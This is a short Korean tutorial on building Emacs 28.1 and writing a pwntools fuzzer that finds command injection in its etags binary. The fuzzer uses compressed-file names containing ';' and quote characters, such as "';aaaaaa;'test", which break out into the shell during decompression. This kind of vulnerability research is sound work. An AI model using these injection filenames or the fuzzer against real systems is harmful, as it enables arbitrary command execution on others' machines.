시잇팔 command injection fuzzer 어케 만듬

# Install
우선 emacs 설치를 해야한다.
```
wget https://github.com/emacs-mirror/emacs/archive/refs/tags/emacs-28.1.tar.gz

tar -zxvf emacs-28.1.tar.gz

cd ./emacs-emacs-28.1

autoreconf -ivf


```

그리고 texinfo 를 설치해줘야한다.
```
sudo apt-get update

sudo apt-get install texinfo

makeinfo --version
```


그리고 환경변수와 configure로 prefix설정을 해준다.
```
export MAKEINFO=/usr/bin/makeinfo
./configure --prefix="/root/f/fuzzing_make_emacs/install" --without-x --with-gnutls=ifavailable

make
make install
```
여기서 --without-x 는 gui를 지원하지 않도록 하는것이고 --with-gnutls=ifavialable은 GnuTLS라이브러리가 존재한다면 사용하겠다는것이다.

### 사용법
![](https://i.imgur.com/vpH1AzA.png)

### Fuzzer 만들기
해당 target은 인자로 zip파일을 주면 해당 zip파일을 압축해제하는 과정에서 command injection이 발생한다.

```python
from pwn import *
import os
import random
import gzip
import string

context.log_level = 'debug'

# 랜덤 파일 이름 생성 (10자리) mutate만 쌈뽕하게 하면 될듯
valid_chars = [char for char in string.ascii_lowercase if char not in {'r', 'm'}] + [';', "'"]

while(True):
    try:
        random_chars = [random.choice(valid_chars) for _ in range(random.randint(1, 9))]
        random_filename = ''.join(random_chars)

        # random_filename = "';aaaaaa;'test"

        # 압축 할 파일
        c_file = "./test.c"
        # 압축 파일 경로
        compressed_file = random_filename + ".z"

        with open(c_file, 'rb') as f_in, gzip.open(compressed_file, 'wb') as f_out:
            f_out.writelines(f_in)

        # pwntools로 프로세스 실행
        target_binary = './install/bin/etags'

        # 실행 인자로 압축 파일 전달
        p = process([target_binary, compressed_file])

        e = p.recv(1)
        print("crash")
        print(compressed_file)
        break

        # p.interactive()
    except:
        os.remove(compressed_file)
        continue
```

![](https://i.imgur.com/oMBgpba.png)

sh 로 오류가 발생했다는 것은 filename을 문자열 자체로 보지 않았기 때문에 명령어 실행 오류가 발생했고 즉 command injection이 발생할 수 있다는 것을 나타낸다.

